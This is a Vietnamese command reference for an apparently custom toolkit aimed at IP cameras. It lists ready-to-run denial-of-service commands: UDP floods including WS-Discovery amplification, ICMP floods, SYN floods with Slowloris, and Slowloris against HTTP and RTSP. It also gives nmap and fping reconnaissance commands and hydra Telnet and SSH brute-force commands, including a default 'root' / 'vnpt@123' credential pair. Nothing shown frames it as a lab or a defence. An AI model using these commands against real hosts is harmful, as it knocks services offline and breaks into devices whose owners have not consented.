Lệnh tham khảo

DoS — UDP Flood
--udp-flood --udp-threads 1 --udp-rate 100 --udp-payload raw --udp-port 514 UDP raw port 514, 100 pkt/s
--udp-flood --udp-threads 9 --udp-rate 1000 --udp-payload raw --udp-port 514 UDP raw 9 threads, 1000 pkt/s
--udp-flood --udp-threads 4 --udp-rate 0 --udp-payload wsd --udp-port 3702 WS-Discovery amplification, max speed
DoS — ICMP Flood
--icmp-flood --icmp-threads 2 --icmp-rate 100 --icmp-size 64 ICMP flood 100 pkt/s
--icmp-flood --icmp-threads 4 --icmp-rate 0 --icmp-size 1472 ICMP flood max size, max speed
DoS — SYN Flood
--connections 500 --synflood --synflood-threads 20 --synflood-rate 0 SYN flood + Slowloris, auto-scan port, max speed
--connections 200 --synflood --synflood-threads 10 --synflood-rate 50 SYN flood nhẹ, 50 pkt/s/thread
DoS — Slowloris
80 --connections 50 --dribble 5 --proto http Slowloris HTTP port 80
554 --connections 30 --dribble 5 --proto rtsp Slowloris RTSP port 554
Recon — Ping Sweep (fping)
fping -a -q -g 192.168.1.1 192.168.1.254 Scan toàn subnet tìm host sống
fping -c 3 -p 200 <IP1> <IP2> Ping 3 lần, khoảng cách 200ms
Recon — Port Scan (nmap)
nmap -sT -Pn -n -p 22,23,80,443,554 <IP> TCP Connect scan, an toàn
nmap -sT -Pn -n --top-ports 100 <IP> TCP top 100 port
nmap -sU -Pn -n -p 53,67,123,161 <IP> UDP scan (cần root)
Brute-force (hydra)
hydra -l root -p vnpt@123 -t 1 telnet://<IP> Telnet 1 cặp credentials
hydra -l root -p root -t 1 ssh://<IP> SSH 1 cặp credentials
hydra -L user.txt -P password.txt ssh://<IP> SSH — hai file trên Pi, tự chuyển sang Camera
hydra -L user.txt -P password.txt telnet://<IP> Telnet — hai file trên Pi, tự chuyển sang Camera
cam-run Utility
cam-run --inspect Xem thông tin camera (CPU/RAM/disk)
cam-run --list Liệt kê tool có sẵn
